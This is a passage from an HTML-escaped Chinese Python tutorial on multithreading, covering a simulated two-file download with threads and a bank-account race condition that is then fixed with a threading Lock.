&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;开始下载&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__filename)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        time_to_download=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(time_to_download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成！耗时&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__filename,time_to_download))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Python学习手册.pdf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTML学习视频.pdf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    t2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因为多线程可以共享进程的内存空间，因此要实现多线程间的通信相对简单。&lt;&#x2F;p&gt;
&lt;p&gt;一般情况下，创建一个全局变量，所有的线程共享这个全局变量即可。但是当多个线程共享同一个变量（称之为资源），很可能产生不可控的结果，从而导致程序失效甚至崩溃。&lt;&#x2F;p&gt;
&lt;p&gt;如果一个资源被多个线程竞争使用，我们通常称为‘临界资源’,对临界资源的访问是需要保护的，否则资源会处于混乱状态。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建一个构造函数中的私有变量，初始值为0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;yu_e&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;money&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#计算存款后的余额&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        new_balance=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance+money&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#受理存款业务需要0.1秒时间&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0.0001&lt;&#x2F;span&gt;&lt;span&gt;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#时间的长短和Python的处理速度相关&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#修改账户余额&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance=new_balance&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    @&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;property&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;balance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;AddMoneyThread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;account&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;money&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__account=account&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__money=money&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__account.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;yu_e&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__money)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    account=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Account&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    threads=[]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建100个存款的线程向同一个账户存钱&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AddMoneyThread&lt;&#x2F;span&gt;&lt;span&gt;(account,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        threads.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(t)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;threads:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;账户的余额为：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;元&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%account.balance)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;当sleep(0.0001)的时候，运行的结果远小于期望的结果100，这是因为我们没有对银行账户这个临界资源加以保护。因为多个线程账户余额都是从初始值0开始递加的，所以就会得到错误的结果。&lt;&#x2F;p&gt;
&lt;p&gt;要解决这个问题，就要使用锁。只有获得锁的线程才能访问临界资源。没有锁的线程只能被阻塞起来，直到获得锁的线程释放锁才有机会获得锁。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread,Lock&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建一个构造函数中的私有变量，初始值为0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#设置锁&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__lock=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Lock&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;yu_e&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;money&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#先获取锁才能执行后面的代码&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__lock.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;acquire&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#计算存款后的余额&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            new_balance=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance+money&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#受理存款业务需要0.1秒时间&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0.0001&lt;&#x2F;span&gt;&lt;span&gt;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#时间的长度和Python的处理速度相关&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#修改账户余额&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance=new_balance&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#不管有没有异常，都释放锁&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__lock.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;release&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    @&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;property&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;balance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__balance&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;AddMoneyThread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
